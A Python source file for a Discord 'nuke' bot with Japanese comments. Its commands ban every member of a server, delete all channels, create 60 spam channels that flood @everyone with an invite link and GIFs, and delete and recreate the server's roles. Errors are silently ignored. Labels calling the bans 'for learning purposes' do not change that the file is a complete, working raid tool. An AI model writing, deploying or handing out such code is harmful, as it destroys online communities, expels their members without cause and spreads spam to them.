# main.py

import discord
from discord.ext import commands
import asyncio
import os
from dotenv import load_dotenv
import random

# Railwayでは load_dotenv() はローカル用。環境変数はデプロイ時に直接設定。
load_dotenv()
TOKEN = os.getenv("DISCORD_TOKEN")

intents = discord.Intents.all()
bot = commands.Bot(command_prefix="!", intents=intents)

@bot.event
async def on_ready():
    print(f"✅ Bot起動完了: {bot.user}")

# !ban: メンバー全BAN
@bot.command()
async def ban(ctx):
    for member in ctx.guild.members:
        if member != ctx.author and member != bot.user:
            try:
                await member.ban(reason="学習目的BAN")
            except:
                pass

# !cccp: チャンネル削除＋作成＋スパム送信
@bot.command()
async def cccp(ctx):
    guild = ctx.guild

    async def delete_channel(channel):
        try:
            await channel.delete()
        except:
            pass

    await asyncio.gather(*(delete_channel(ch) for ch in guild.channels))

    created_channels = await asyncio.gather(*[
        guild.create_text_channel(f"cccp-{i}") for i in range(60)
    ])

    message = (
        "@everyone @here\n"
        "**CCCP ON TOP**\n"
        "[今すぐ参加](https://discord.gg/ncUCZfJXRs)\n"
        "![GIF1](https://imgur.com/NbBGFcf.gif)\n"
        "![GIF2](https://imgur.com/pY7EpwN.gif)"
    )

    target_channel = created_channels[0]

    async def spam():
        try:
            await target_channel.send(message)
        except:
            pass

    await asyncio.gather(*[spam() for _ in range(60)])

# !roles: ロール削除＋作成
@bot.command()
async def roles(ctx):
    guild = ctx.guild

    async def delete_role(role):
        try:
            if role.name != "@everyone" and role < guild.me.top_role:
                await role.delete()
        except:
            pass

    await asyncio.gather(*[delete_role(role) for role in guild.roles])

    async def create_random_role(i):
        try:
            color = discord.Color.from_rgb(
                random.randint(0, 255),
                random.randint(0, 255),
                random.randint(0, 255)
            )
            await guild.create_role(name=f"CCCP-{i+1}", color=color)
        except:
            pass

    await asyncio.gather(*[create_random_role(i) for i in range(50)])

    await ctx.send("✅ ロール削除＆作成完了（学習目的）")

bot.run(TOKEN)
